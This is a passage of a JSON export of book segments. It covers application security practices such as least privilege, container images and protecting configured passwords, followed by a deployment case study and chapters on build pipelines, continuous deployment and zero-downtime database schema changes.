possible. That makes them savory targets for automated crackers.\n\nThe Principle of Least Privilege\n\nThe principle of “least privilege” mandates that a process should have the lowest level of privilege needed to accomplish its task. This never includes running as root (UNIX/Linux) or administrator (Windows). Anything applica- tion services need to do, they should do as nonadministrative users.\n\nI’ve seen Windows servers left logged in as administrator for weeks at a time —with remote desktop access—because some ancient piece of vendor software required it. (This particular package also was not able to run as a Windows service, so it was essentially just a Windows desktop application left running for a long time. That is not production ready!)\n\nSoftware that runs as root is automatically a target. Any vulnerability in root- level software automatically becomes a critical issue. Once an attacker has cracked the shell to get root access, the only way to be sure the server is safe is to reformat and reinstall.\n\nTo further contain vulnerabilities, each major application should have its own user. The “Apache” user shouldn’t have any access to the “Postgres” user, for example.\n\nOpening a socket on a port below 1024 is the only thing that a UNIX applica- tion might require root privilege for. Web servers often want to open port 80 by default. But a web server sitting behind a load balancer (see Load Balancing, on page 177) can use any port.\n\nContainers and Least Privilege\n\nContainers provide a nice degree of isolation from each other. Instead of cre- ating multiple application-specific users on the host operating system, you can package each application into its own container. Then the host kernel will keep the containerized applications out of each others’ filesystems. That’s helpful for reducing the containers’ level of privilege.\n\nBe careful, though. People often start with a container image that includes most of an operating system. Some containerized applications run a whole init system inside the container, allowing multiple shells and processes. At that point, the container has its own fairly large attack surface. It must be\n\nreport erratum • discuss\n\nChapter 11. Security • 232\n\nsecured. Sadly, patch management tools don’t know how to deal with contain- ers right now. As a result, a containerized application may still have operating system vulnerabilities that IT patched days or weeks ago.\n\nThe solution is to treat container images as perishable goods. You need an automated build process that creates new images from an upstream base and your local application code. Ideally this comes from your continuous integration pipeline. Be sure to configure timed builds for any application that isn’t still under active development, though.\n\nConfigured Passwords\n\nPasswords are the Brazil nut of application security; every mix has them, but nobody wants to deal with them. There’s obviously no way that somebody can interactively key in passwords every time an application server starts up. Therefore, database passwords and credentials needed to authenticate to other systems must be configured in persistent files somewhere.\n\nAs soon as a password is in a text file, it is vulnerable. Any password that grants access to a database with customer information is worth thousands of dollars to an attacker and could cost the company thousands in bad pub- licity or extortion. These passwords must be protected with the highest level of security achievable.\n\nAt the absolute minimum, passwords to production databases should be kept separate from any other configuration files. They should especially be kept out of the installation directory for the software. (I’ve seen operations zip up the entire installation folder and ship it back to development for analysis, for example, during a support incident.) Files containing passwords should be made readable only to the owner, which should be the application user. If the application is written in a language that can execute privilege separation, then it’s reasonable to have the application read the password files before downgrad- ing its privileges. In that case, the password files can be owned by root.\n\nPassword vaulting keeps passwords in encrypted files, which reduces the security problem to that of securing the single encryption key rather than securing multiple text files. This can assist in securing the passwords, but it is not, by itself, a complete solution. Because it’s easy to inadvertently change or overwrite file permissions, intrusion detection software such as Tripwire should be employed to monitor permissions on those vital files.22\n\n22. www.tripwire.com\n\nreport erratum • discuss\n\nSecurity as an Ongoing Process • 233\n\nAWS Key Management Service (KMS) is useful here. With KMS, applications use API calls to acquire decryption keys. That way the encrypted data (the database passwords) don’t sit in the same storage as the decryption keys! If you use Vault, then it holds the database credentials directly in the vault.\n\nIn every case, it’s important to expunge the key from memory as soon as possible. If the application keeps the keys or passwords in memory, then memory dumps will also contain them. For UNIX systems, core files are just memory dumps of the application. An attacker that can provoke a core dump can get the passwords. It’s best to disable core dumps on production applica- tions. For Windows systems, the “blue screen of death” indicates a kernel error, with an accompanying memory dump. This dump file can be analyzed with Microsoft kernel debugging tools; and depending on the configuration of the server, it can contain a copy of the entire physical memory of the machine—passwords and all.\n\nSecurity as an Ongoing Process\n\nFrameworks can’t protect you from the Top 10. Neither can a one-time review by your company’s AppSec team. Security is an ongoing activity. It must be part of your system’s architecture: crucial decisions about encrypted commu- nication, encryption at rest, authentication, and authorization are all cross- cutting concerns that affect your entire system.\n\nNew attacks emerge all the time. You must have a process to discover attacks (hopefully before they are used on you) and remediate your system quickly.\n\nThis is doubly true when you deploy technology that hasn’t been battle- hardened. New technology with new APIs will have vulnerabilities. That doesn’t mean you should give up the advantages it offers. It does mean that you need to be vigilant about patching it. Make sure you can redeploy your servers on a moment’s notice.\n\nWrapping Up\n\nApplication security affects life and livelihood. It’s another area where we need to consider both the component-level behavior and the behavior of the system as a whole. Two secure components don’t necessarily mix to make a secure system.\n\nThe most common target of value is user data, especially credit card informa- tion. Even if you don’t handle credit cards, you might not be off the hook. Industrial espionage is real and it can sometimes look as harmless as the location of a shipment of tasty pecans.\n\nreport erratum • discuss",
      "page_number": 232,
      "chapter_number": 29,
      "summary": "This happens whenever a caller provides input that’s used to construct a file name Key topics include attacker, data, and security.",
      "keywords": [
        "n’t",
        "requests",
        "data",
        "service",
        "request",
        "Security",
        "API",
        "APIs",
        "user",
        "attack",
        "report erratum",
        "make",
        "OWASP Top",
        "system",
        "report"
      ],
      "concepts": [
        "attacker",
        "data",
        "security",
        "secure",
        "user",
        "requests",
        "request",
        "application",
        "applications",
        "uses"
      ],
      "similar_chapters": [
        {
          "book": "AI Engineering Building Applications",
          "chapter": 23,
          "title": "Segment 23 (pages 457-476)",
          "relevance_score": 0.49,
          "method": "sentence_transformers"
        },
        {
          "book": "Building Python Microservices with FastAPI",
          "chapter": 5,
          "title": "Segment 5 (pages 33-42)",
          "relevance_score": 0.46,
          "method": "sentence_transformers"
        },
        {
          "book": "Software Architecture",
          "chapter": 31,
          "title": "Segment 31 (pages 301-316)",
          "relevance_score": 0.45,
          "method": "sentence_transformers"
        },
        {
          "book": "Building Python Microservices with FastAPI",
          "chapter": 29,
          "title": "Segment 29 (pages 265-274)",
          "relevance_score": 0.44,
          "method": "sentence_transformers"
        },
        {
          "book": "A Philosophy of Software Design",
          "chapter": 10,
          "title": "Segment 10 (pages 77-87)",
          "relevance_score": 0.43,
          "method": "sentence_transformers"
        }
      ]
    },
    {
      "number": 30,
      "title": "Segment 30 (pages 240-247)",
      "start_page": 240,
      "end_page": 247,
      "detection_method": "topic_boundary",
      "content": "Chapter 11. Security • 234\n\nBeware the pie crust defense. Internal APIs need to be protected with good authentication and authorization. It’s also vital to encrypt data on the wire, even inside an organization. There’s no such thing as a secure perimeter today. Bitter experience shows that breaches can be present for a long time before detection, more than enough for an attacker to devise recipes to get at that sweet user data.\n\nFull treatment of application security is way beyond the scope of this book. The topics covered in this chapter earned their place by sitting in the inter- section of software architecture, operations, and security. Consider this a starting point in a journey. Follow the trail from here into the rich and scary world of CVEs,23 CWEs,24 and CERTs.25\n\nThis finishes our slow zoom out from the physical substrate—copper, silicon, and iron oxide—all the way to systemic considerations. In the next part, we will look at the moment of truth: deployment!\n\n23. http://cve.mitre.org 24. https://cwe.mitre.org/index.html 25. www.cert.org\n\nreport erratum • discuss\n\nPart III\n\nDeliver Your System\n\nCHAPTER 12\n\nCase Study: Waiting for Godot\n\nIt isn’t enough to write the code. Nothing is done until it runs in production. Sometimes the path to production is a smooth and open highway. Other times, especially with older systems, it’s a muddy track festooned with potholes, bandits, and checkpoints with border guards. This was one of the bad ones.\n\nI turn my grainy eyes toward the clock on the wall. The hands point to 1:17 a.m. I’d swear time has stopped. It has always been 1:17. I’ve seen enough film noir that I expect a fly to crawl across the face of the clock. There is no fly. Even the flies are asleep now. On the Polycom, someone is reporting status. It’s a DBA. One of the SQL scripts didn’t work right, but he “fixed” it by run- ning it under a different user ID.\n\nThe wall clock doesn’t mean much right now. Our Lamport clock is still stuck a little before midnight. The playbook has a row that says SQL scripts finish at 11:50 p.m. We’re still on the SQL scripts, so logically we’re still at 11:50 p.m. Before dawn, we need our playbook time and solar time to converge in order for this deployment to succeed.\n\nThe first row in the playbook started yesterday afternoon with a round of status reports from each area: dev, QA, content, merchants, order management, and so on. Somewhere on the first page of the playbook we had a go/no-go meeting at 3 p.m. Everyone gave the deployment a go, although QA said that they hadn’t finished testing and might still find a showstopper. After the go/no-go meeting, an email went out to the business stakeholders, announcing that the deployment would go forward. That email is their cue to go home, eat dinner at four in the afternoon, and get some sleep. We need them to get up at 1 a.m. to “smoke test” the new features. That’s our UAT window: 1 to 3 a.m.\n\nIt’s 1:17 and the business stakeholders are awake and waiting to do their thing. I’m waiting to do my thing. When we get to about 12:40 in the playbook\n\nreport erratum • discuss\n\nChapter 12. Case Study: Waiting for Godot • 238\n\nI run a script. I don’t know how long I’ll have to wait, but somehow I’m sure the clock will still say 1:17. Until then, I watch some numbers on a graph. In a release a couple of years ago, those numbers went the wrong way. So now we watch them. I know the code that triggered the problem was rewritten long ago. Nothing to be done. But the playbook calls for us to monitor those numbers and so we do. The release commander will sometimes ask what those numbers are.\n\nTwo days ago, we started reviewing and updating the playbook. We have a process for updating the process. The release commander walks through the whole thing row by row, and we confirm each row or update them for this particular release. Sometimes there are more steps, sometimes fewer. Different releases affect different features, so we need different people available to debug. Each review meeting takes two or three hours.\n\nAround the long conference table, more than twenty heads are bowed over their laptops. They look like they are praying to the Polycoms: “Please say it worked. Please say it worked.” An equal number of people are dialed in to the same conference bridge from four locations around the world. In total, this release will consume more than forty of us over a 24-hour period. Most of the operations team members are here. The remainder are asleep so that they can be fresh to fix leftover problems in the morning. A while back we had an operator error that we blamed on fatigue. So now there’s a step in the playbook for the “B team” to go home and sleep. I tried to sneak in rows from Sandra Boynton’s Going to Bed Book—\n\n“The day is done, they say goodnight.\n\nAnd somebody turns off the light.”\n\nBut the playbook has no room for whimsy.\n\nOur Lamport clock jumps forward while I’m not looking. The release comman- der tells Sys Ops to update symlinks. That’s my cue: I am Sys Ops. It’s not as cool as saying, “I am Iron Man.” The term “DevOps” won’t exist for another year, and in a different galaxy than this conference room. I tap Enter in my PuTTY window logged in to the jumphost—the only machine the others will accept SSH connections from. My script does three things on each machine. It updates a symbolic link to point to the new code drop, runs the JSP pre- compiler, and starts the server processes. A different script placed the code on the servers hours ago.\n\nNow my turn is done until we finish UAT. Some energy gets generated when a voice emanates from the Polycom, informing us, “It didn’t work.” That may\n\nreport erratum • discuss\n\nChapter 12. Case Study: Waiting for Godot • 239\n\nbe the least helpful bug report ever received. It turns out the person was testing a page that wasn’t part of this release and had a known bug from two or three years back.\n\nI don’t deal with boredom very well. After some fruitful contemplation on the nature of the buzz produced by fluorescent lights (and that the pitch must be different in countries on 50 hertz power), I start to wonder how much this deployment costs. A little napkin math surprises me enough that I make a spreadsheet. The size of the army times one day. I don’t know the cost structure, but I can guess that $100 per hour per person is not too far off. Add in some lost sales while the site is “gone fishing,” but not a lot because we’re offline during a slow part of the day. It’s about $100,000 to run this deployment. We do this four to six times a year.\n\nYears later, I would witness a deployment at the online retailer Etsy. An investor was visiting, and as a routine part of the visit the company had him push the button to run its “deployinator.” The investor seemed pleased but not impressed. I felt a kind of bubbling hysteria. I needed to grab him by the collar. Didn’t he understand what that meant? How amazing it was? At the same time, I had a deep sense of loss: all that time in the deployment army. All that wasted potential. The wasted humanity! Using people as if they were bots. Disrupting lives, families, sleep patterns...it was all such a waste.\n\nIn the end, our deployment failed UAT. Some feature had passed QA because the data in the QA environment didn’t match production. (Stop me if you’ve heard this one before.) Production had extra content that included some JavaScript to rewrite part of a page from a third party and it didn’t work with the new page structure. The clock on the wall claimed it was around 5 a.m. when we finished the rollback procedure. That afternoon, we started planning the second attempt scheduled for two days hence.\n\nYou may have a deployment army of your own. The longer your production software has existed the more likely it is. In the following chapters, we’ll look at the forces that lead to this antipattern. We’ll also see how to climb out of the pit of despair. As you’ll see, making deployments faster and more routine has an immediate financial benefit. More than that, though, a virtuous cycle kicks in that gives you new superpowers. Best of all, you can stop wasting human potential on jobs that should be scripts.\n\nreport erratum • discuss\n\nCHAPTER 13\n\nDesign for Deployment\n\nIn the last chapter, we were stuck in a living nightmare, one of many endless deployments that waste countless hours and dollars. Now we turn to sweeter dreams as we contemplate automated deployments and even continuous deployments. In this chapter you learn how to design your applications for easy rollout. Along the way, we look at packaging, integration point versioning, and database schemata.\n\nSo Many Machines\n\nGiven the diversity of virtualization and deployment options we have now, words like server, service, and host have gotten muddy. For the rest of this chapter, the word machine will be a simple stand-in for configurable operating system instance. If you’re running on real metal, then it means the physical host. If you’re running a virtual machine, container, or unikernel, then that is the unit. When the distinctions matter, the text will call them out. Service will refer to a callable interface for others to use. A service is always made up of redundant copies of software running on multiple machines.\n\nSo where are we now? We have more ways to run software in production than ever. The net result is that our environments have more machines than ever, mostly virtual. We talk about pets and cattle, but given their ephemeral life- spans, we should call some of them “mayflies.” There are machines that operators never touch because they’re created by other machines. That means yet more configurations to manage and more configuration management tools to aid us. If we accept this complexity, we should certainly get something back out of it in the form of increased uptime during deployments.\n\nreport erratum • discuss\n\nChapter 13. Design for Deployment • 242\n\nThe Fallacy of Planned Downtime\n\nThroughout this book, our fundamental premise is that version 1.0 is the beginning of the system’s life. That means we shouldn’t plan for one or a few deployments to production, but many upon many. Once upon a time, we wrote our software, zipped it up, and threw it over the wall to operations so they could deploy it. If they were nice, then maybe we would add in some release notes about whatever new configuration options they should set. Operations would schedule some “planned downtime” to execute the release.\n\nI hate the phrase “planned downtime.” Nobody ever clues the users in on the plan. To the users, downtime is downtime. The internal email you sent announcing the downtime doesn’t matter a bit to your users. Releases should be like what Agent K says in Men in Black: “There’s always an Arquillian Battle Cruiser, or Corillian Death Ray, or intergalactic plague, [or a major release to deploy], and the only way users get on with their happy lives is that they do not know about it!”\n\nMost of the time, we design for the state of the system after a release. The trouble is that that assumes the whole system can be changed in some instantaneous quantum jump. It doesn’t work that way. The process of updating the system takes time. A typical design requires that the system always sees itself in either the “before” or “after” state, never “during.” The users get to see the system in the “during” state. Even so, we want to avoid disrupting their experiences. How do we reconcile these perspectives?\n\nWe can pull it off by designing our applications to account for the act of deployment and the time while the release takes place. In other words, we don’t just write for the end state and leave it up to operations to figure out how to get the stuff running in production. We treat deployment as a feature. The remainder of this chapter addresses three key concerns: automation, orchestration, and zero-downtime deployment.\n\nAutomated Deployments\n\nOur goal in this chapter is to learn how we need to design our applications so that they’re easy to deploy. This section describes the deployment tools themselves to give us a baseline for understanding the design forces they impose. This overview won’t be enough for you to pick up Chef and start writing deployment recipes, but it will put Chef and tools like it into context so we know what to do with our ingredients.\n\nreport erratum • discuss\n\nAutomated Deployments • 243\n\nThe first tool of interest is the build pipeline. It picks up after someone com- mits a change to version control. (Some teams like to build every commit to master; others require a particular tag to trigger a build.) In some ways, the build pipeline is an overgrown continuous integration (CI) server. (In fact, build pipelines are often implemented with CI servers.) The pipeline spans both development and operations activities. It starts exactly like CI with steps that cover development concerns like unit tests, static code analysis, and compilation. See the figure that follows. Where CI would stop after publishing a test report and an archive, the build pipeline goes on to run a series of steps that culminate in a production deployment. This includes steps to deploy code into a trial environment (either real or virtual, maybe a brand-new virtual environment), run migration scripts, and perform integration tests.\n\nCompile\n\ndeploy\n\nVersionControl\n\nBuildManager\n\nDeveloper\n\ncommit\n\nnotify\n\nAnalyze\n\nrun\n\nArtifacts\n\nBuildLogs\n\nConﬁgMgmt\n\nUnit Test\n\nuse\n\nPackage\n\nDeployTrial\n\nIn SituTest\n\nDeployReal\n\nPublish\n\nlogpost\n\nWe call it a build pipeline, but it’s more like a build funnel. Each stage of a build pipeline is looking for reasons to reject the build. Tests failed? Reject it. Lint complains? Reject it. Build fails integration tests in staging? Reject it. Finished archive smells funny? Reject it.\n\nThis figure lumps steps together for clarity. In a real pipeline, you’ll probably have a larger number of smaller steps. For example, “deploy trial” will usually encompass the preparation, rollout, and cleanup phases that we’ll see later in this chapter.\n\nThere are some popular products for making build pipelines. Jenkins is probably the most commonly used today.1 I also like Thoughtworks’ GoCD.2 A number of new tools are vying for this space, including Netflix’s Spinnaker\n\n1. 2.\n\nhttps://jenkins.io\n\nwww.thoughtworks.com/go\n\nreport erratum • discuss",
      "page_number": 240,
      "chapter_number": 30,
      "summary": "This chapter covers segment 30 (pages 240-247). Key topics include deploy, deployments, and security. You need an automated build process that creates new images from an upstream base and your local application code.",
      "keywords": [
        "n’t",
        "Passwords",
        "application",
        "deployment",
        "Security",
        "application security",
        "report erratum",
        "password files",
        "files",
        "system",
        "playbook",
        "time",
        "report",
        "database passwords",
        "production"
      ],
      "concepts": [
        "deploy",
        "deployments",
        "security",
        "secure",
        "files",
        "application",
        "applications",
        "different",
        "report",
        "time"
      ],
      "similar_chapters": [
        {
          "book": "Designing Machine Learning Systems An Iterative Process for Production-Ready Applications",
          "chapter": 40,
          "title": "Segment 40 (pages 342-350)",
          "relevance_score": 0.65,
          "method": "sentence_transformers"
        },
        {
          "book": "Microservices Up and Running",
          "chapter": 19,
          "title": "Segment 19 (pages 193-200)",
          "relevance_score": 0.58,
          "method": "sentence_transformers"
        },
        {
          "book": "Building Python Microservices with FastAPI",
          "chapter": 45,
          "title": "Segment 45 (pages 408-415)",
          "relevance_score": 0.54,
          "method": "sentence_transformers"
        },
        {
          "book": "Microservices Up and Running",
          "chapter": 2,
          "title": "Segment 2 (pages 9-16)",
          "relevance_score": 0.54,
          "method": "sentence_transformers"
        },
        {
          "book": "AI Engineering Building Applications",
          "chapter": 5,
          "title": "Segment 5 (pages 82-102)",
          "relevance_score": 0.53,
          "method": "sentence_transformers"
        }
      ]
    },
    {
      "number": 31,
      "title": "Segment 31 (pages 248-255)",
      "start_page": 248,
      "end_page": 255,
      "detection_method": "topic_boundary",
      "content": "Chapter 13. Design for Deployment • 244\n\nand Amazon’s AWS Code Pipeline.3,4 And you always have the option to roll your own out-of-shell scripts and post-commit hooks. My advice is to dodge the analysis trap. Don’t try to find the best tool, but instead pick one that suffices and get good with it.\n\nAt the tail end of the build pipeline, we see the build server interacting with one of the configuration management tools that we first saw in Chapter 8, Processes on Machines, on page 155. A plethora of open-source and commercial tools aim at deployments. They all share some attributes. For one thing, you declare your desired configuration in some description that the tool understands. These descriptions live in text files so they can be version-controlled. Instead of describing the specific actions to take, as a shell script would, these files describe a desired end state for the machine or service. The tool’s job is to figure out what actions are needed to make the machine match that end state.\n\nConfiguration management also means mapping a specific configuration onto a host or virtual machine. This mapping can be done manually by an operator or automatically by the system itself. With manual assignment, the operator tells the tool what each host or virtual machine must do. The tool then lays down the configurations for that role on that host. Refer to the figure that follows.\n\n“web”\n\nServer 3\n\nServer 2\n\nServer 1\n\nA\n\nB\n\nAdmin\n\napply\n\n“app”\n\n“web”\n\nC\n\napply\n\nAutomatic role assignment means that the operator doesn’t pick roles for specific machines. Instead, the operator supplies a configuration that says, “Service X should be running with Y replicas across these locations.” This style goes hand-in-hand with a platform-as-a-service infrastructure, as shown in the figure on page 245. It must then deliver on that promise by running the correct number of instances of the service, but the operator doesn’t care which\n\n3. 4.\n\nwww.spinnaker.io\n\nhttps://aws.amazon.com/codepipeline\n\nreport erratum • discuss\n\nAutomated Deployments • 245\n\nHost 3\n\nHost 2\n\nPaaSController\n\nAdmin\n\nI need2 “web”1 “app”\n\nrun “app” VM\n\nrun “web” VM\n\nHost 1\n\nrun “web”VM\n\nmachines handle which services. The platform combines the requested capacity with constraints. It finds hosts with enough CPU, RAM, and disk, but avoids co-locating instances on hosts. Because the services can be running on any number of different machines with different IP addresses, the platform must also configure the network for load balancing and traffic routing.\n\nAlong with role mapping, there are also different strategies for packaging and delivering the machines. One approach does all the installation after booting up a minimal image. A set of reusable, parameterizable scripts installs OS packages, creates users, makes directories, and writes files from templates. These scripts also install the designated application build. In this case, the scripts are a deliverable and the packaged application is a deliverable.\n\nThis “convergence” approach says the deployment tool must examine the current state of the machine and make a plan to match the desired state you declared. That plan can involve almost anything: copying files, substituting values into templates, creating users, tweaking the network settings, and more. Every tool also has a way to specify dependencies among the different steps. It is the tool’s job to run the steps in the right order. Directories must exist before copying files. User accounts must be created before files can be owned by them, and so on.\n\nUnder the immutable infrastructure approach that we first encountered in Immutable and Disposable Infrastructure, on page 158, the unit of packaging is a virtual machine or container image. This is fully built by the build pipeline and registered with the platform. If the image requires any extra configuration, it must be injected by the environment at startup time. For example, Amazon Machine Images (AMIs) are packaged as virtual machines. A machine instance created from an AMI can interrogate its environment to find out the “user data” supplied at launch time.\n\nreport erratum • discuss\n\nChapter 13. Design for Deployment • 246\n\nPeople in the immutable infrastructure camp will argue that convergence never works. Suppose a machine has been around a while, a survivor of many deployments. Some resources may be in a state the configuration management tool just doesn’t know how to repair. There’s no way to get from the current state to the desired state. Another, more subtle issue is that parts of the machine state aren’t even included in your configuration recipes. These will be left untouched by the tool, but might be radically different than you expect. Think about things like kernel parameters and TCP timeouts.\n\nUnder immutable infrastructure, you always start with a basic OS image. Instead of trying to converge from an unknown state to the desired state, you always start from a known state: the master OS image. This should succeed every time. If not, at least testing and debugging the recipes is straightforward because you only have to account for one initial state rather than the stucco- like appearance of a long-lived machine. When changes are needed, you update the automation scripts and build a new machine. Then the outdated machine can simply be deleted.\n\nNot surprisingly, immutable infrastructure is closely aligned with infrastruc- ture-as-a-service (IaaS), platform-as-a-service (PaaS), and automatic mapping. Convergence is more common in physical deployments and on long-lived vir- tual machines and manual mapping. In other words, immutable infrastructure is for cattle, convergence is for pets.\n\nContinuous Deployment\n\nBetween the time a developer commits code to the repository and the time it runs in production, code is a pure liability. Undeployed code is unfinished inventory. It has unknown bugs. It may break scaling or cause production downtime. It might be a great implementation of a feature nobody wants. Until you push it to production, you can’t be sure. The idea of continuous deployment is to reduce that delay as much as possible to minimize the lia- bility of undeployed code.\n\nA vicious cycle is at play between deployment size and risk, too. Look at the figure on page 247. As the time from check-in to production increases, more changes accumulate in the deployment. A bigger deployment with more change is definitely riskier. When those risks materialize, the most natural reaction is to add review steps as a way to mitigate future risks. But that will lengthen the commit-production delay, which increases risk even further!\n\nThere’s only one way to break out of this cycle: internalize the motto, “If it hurts, do it more often.” In the limit, that statement means, “Do everything\n\nreport erratum • discuss\n\nContinuous Deployment • 247\n\nLonger delaybetweendeployments\n\nMore changesin each deployment\n\nHigher riskof bugs and downtime\n\nReview processes\n\ncontinuously.” For deployments, it means run the full build pipeline on every commit.\n\nA place where we see variations is at the very final stages of the build pipeline. Some teams trigger the final production deployment automatically. Others have a “pause” stage, where some human must provide positive affirmation that “yes, this build is good.” (Worded another way, it says, “Yes, you may fire me if this fails.”) Either approach is valid, and the one you choose depends greatly on your organization’s context: if the cost of moving slower exceeds the cost of an error in deployment, then you’ll lean toward automatic deployment to production. On the other hand, in a safety-critical or highly regulated environment, the cost of an error may be much larger than the cost of moving slowly relative to the competition. In that case, you’ll lean toward a human check before hitting production. You just need to be sure that an authorized button-pusher is available whenever a change needs to happen, even if that’s an emergency code change at 2 a.m.\n\nNow that we have a better understanding of what a build pipeline covers, let’s look at the phases of a deployment.\n\nreport erratum • discuss\n\nChapter 13. Design for Deployment • 248\n\nPhases of Deployment\n\nIt’s no surprise that continuous deployment first arose in companies that use PHP. A deployment in a PHP application can be as simple as copying some files onto a production host. The very next request to that host picks up the new files. The only thing to worry about is a request that comes in while the file is only partially copied.\n\nNear the other end of the spectrum, think about a five-million-line Java application, built into one big EAR file. Or a C# application with a couple hundred assemblies. These applications will take a long time to copy onto the target machine and then a large runtime process to restart. They’ll often have in-memory caches and database connection pools to initialize.\n\nWe can fill in the middle part of the spectrum as shown in this diagram. Go further to the right, and the degree of packaging increases. At the extreme end of the spectrum, we have applications that are deployed as whole virtual machine images.\n\nArchivesFilesWhole Machines\n\nStatic SitesPHPCGI Scripts\n\n.rpm.deb.msi\n\n.ear.war.exe\n\n.jar.dllgem\n\nAMIContainerVMDK\n\nSingle files with no runtime process will always be faster than copying archive files and restarting application containers. In turn, those will always be faster than copying gigabyte-sized virtual machine images and booting an operating system.\n\nWe can relate that grain size to the time needed to update a single machine. The larger the grain, the longer it takes to apply and activate. We must account for this when rolling a deployment out to many machines. It’s no good to plan a rolling deployment over a 30-minute window only to discover that every machine needs 60 minutes to restart!\n\nAs we roll out a new version, both the macroscopic and microscopic time scales come into play. The microscopic time scale applies to a single instance (host, virtual machine, or container). The macroscopic scale applies to the whole rollout. This nesting gives us the structure shown here: one large-scale process with many individual processes nested inside (see the diagram on page 249).\n\nreport erratum • discuss\n\nPhases of Deployment • 249\n\nDeployment\n\nRollout\n\nPrep\n\nCleanup\n\nInstance Update\n\nUpdate\n\nDrain\n\nStartup\n\nPrepOld VersionNew version\n\nAt the microscopic level, it’s important to understand four time spans. First, how long does it take to prepare for the switchover? For mutable infrastruc- ture, this is copying files into place so you can quickly update a symbolic link or directory reference. For immutable infrastructure, this is the time needed to deploy a new image.\n\nSecond, how long does it take to drain activity after you stop accepting new requests? This may be just a second or two for a stateless microservice. For something like a front-end server with sticky session attachment, it could be a long time—your session timeout plus your maximum session duration. Bear in mind you may not have an upper bound on how long a session can stay active, especially if you can’t distinguish bots and crawlers from humans! Any blocked threads in your application will also block up the drain. Those stuck requests will look like valuable work but definitely are not. Either way, you can watch the load until enough has drained that you’re comfortable killing the process or you can pick a “good enough” time limit. The larger your scale, the more likely you’ll just want the time limit to make the whole process more predictable.\n\nThird, how long does it take to apply the changes? If all it takes is a symlink update, this can be very quick. For disposable infrastructure, there’s no “apply the change”; it’s about bringing up a new instance on the new version. In that case, this time span overlaps the “drain” period. On the other hand, if your deployment requires you to manually copy archives or edit configuration files, this can take a while. But, hey, at least it’ll also be more error-prone!\n\nFinally, once you start the new release on a particular machine, how long is it before that instance is ready to receive load? This is more than just your runtime’s startup time. Many applications aren’t ready to handle load until they have loaded caches, warmed up the JIT, established database connec- tions, and so on. Send load to a machine that isn’t open for business yet, and you’ll either see server errors or very long response times for those requests unlucky enough to be the first ones through the door.\n\nreport erratum • discuss\n\nChapter 13. Design for Deployment • 250\n\nThe macroscopic time frame wraps around all the microscopic ones, plus some preparatory and cleanup work. Preparation involves all the things you can do without disturbing the current version of the application. During this time the old version is still running everywhere, but it’s safe to push out new content and assets (as long as they have new paths or URLs).\n\nOnce we think about a deployment as a span of time, we can enlist the application to help with its own deployment. That way, the application can smooth over the things that normally cause us to take downtime for deploy- ments: schema changes and protocol versions.\n\nRelational Database Schemata\n\nDatabase changes are one of the driving factors behind “planned downtime,” especially schema changes to relational databases. With some thought and preparation, we can eliminate the need for dramatic, discontinuous, downtime- inducing changes.\n\nYou probably have a migrations framework in place already. If not, that’s definitely the place to start. Instead of running raw SQL scripts against an admin CLI, you should have programmatic control to roll your schema version forward. (It’s good for testing to roll it backward as well as forward, too.)\n\nBut while a migrations framework like Liquibase helps apply changes to the schema, it doesn’t automatically make those changes forward- and back- ward-compatible. That’s when we have to break up the schema changes into expansion and cleanup phases.\n\nSome schema changes are totally safe to apply before rolling out the code:\n\nAdd a table. • Add views. • Add a nullable column to a table. • Add aliases or synonyms. • Add new stored procedures. • Add triggers. • Copy existing data into new tables or columns.\n\nAll of these involve adding things, so I refer to this as the expansion phase of schema changes. (We’ll look at cleanup a bit later.) The main criterion is that nothing here will be used by the current application. This is the reason for caution with database triggers. As long as those triggers are nonconditional and cannot throw an error, then it’s safe to add them.\n\nreport erratum • discuss\n\nPhases of Deployment • 251\n\nWe don’t see triggers very often in modern application architecture. The main reason I bring them up is because they allow us to create “shims.” In carpen- try, a shim is a thin piece of wood that fills a gap where two structures meet. In deployments, a shim is a bit of code that helps join the old and new versions of the application. For instance, suppose you have decided to split a table. As shown in the figure that follows, in the preparation phase, you add the new table. Once the rollout begins, some instances will be reading and writing the new table. Others will still be using the old table. This means it’s possible for an instance to write data into the old table just before it’s shut down. Whatever you copied into the new table during preparation won’t include that new entity, so it gets lost.\n\nTable A\n\nTable A\n\nAttr 1\n\nAttr 2\n\nAttr 3\n\nAttr 4\n\nID\n\nAttr 2\n\nID\n\nAttr 3\n\nAttr 4\n\nID\n\nTable B\n\nafter insert\n\nAttr 1\n\nShims help solve this by bridging between the old and new structures. For instance, an INSERT trigger on the old table can extract the proper fields and also insert them into the new table. Similarly, an UPDATE trigger on the new table can issue an update to the old table as well. You typically need shims to handle insert, update, and delete in both directions. Just be careful not to create an infinite loop, where inserting into the old table triggers an insert into the new table, which triggers an insert into the old table, and so on.\n\nHalf a dozen shims for each change seems like a lot of work. It is. That’s the price of batching up changes into a release. Later in this chapter, when we talk about the “trickle-then-batch” migration strategy, we’ll see how you can accomplish the same job with less effort by doing more, smaller releases.\n\nDon’t forget to test them on a realistic sample of data, either. I’ve seen a lot of migrations fail in production because the test environment only had nice, polite, QA-friendly data. Forget that. You need to test on all the weird data. The stuff that’s been around for years. The data that has survived years of\n\nreport erratum • discuss",
      "page_number": 248,
      "chapter_number": 31,
      "summary": "The remainder of this chapter addresses three key concerns: automation, orchestration, and zero-downtime deployment Key topics include deployment, deployments, and machines.",
      "keywords": [
        "Deployment",
        "build pipeline",
        "machine",
        "build",
        "time",
        "virtual machine",
        "state",
        "n’t",
        "pipeline",
        "tool",
        "Continuous Deployment",
        "files",
        "report erratum",
        "host",
        "production"
      ],
      "concepts": [
        "deployment",
        "deployments",
        "machines",
        "likely",
        "time",
        "production",
        "products",
        "applications",
        "application",
        "configurations"
      ],
      "similar_chapters": [
        {
          "book": "Designing Machine Learning Systems An Iterative Process for Production-Ready Applications",
          "chapter": 42,
          "title": "Segment 42 (pages 359-366)",
          "relevance_score": 0.64,
          "method": "sentence_transformers"
        },
        {
          "book": "Designing Machine Learning Systems An Iterative Process for Production-Ready Applications",
          "chapter": 40,
          "title": "Segment 40 (pages 342-350)",
          "relevance_score": 0.59,
          "method": "sentence_transformers"
        },
        {
          "book": "Reliable Machine Learning",
          "chapter": 25,
          "title": "Segment 25 (pages 212-220)",
          "relevance_score": 0.58,
          "method": "sentence_transformers"
        },
        {
          "book": "Generative AI with LangChain_2e",
          "chapter": 46,
          "title": "Segment 46 (pages 390-397)",
          "relevance_score": 0.57,
          "method": "sentence_transformers"
        },
        {
          "book": "Generative AI with LangChain_2e",
          "chapter": 49,
          "title": "Segment 49 (pages 415-422)",
          "relevance_score": 0.57,
          "method": "sentence_transformers"
        }
      ]
    },
    {
      "number": 32,
      "title": "Segment 32 (pages 256-265)",
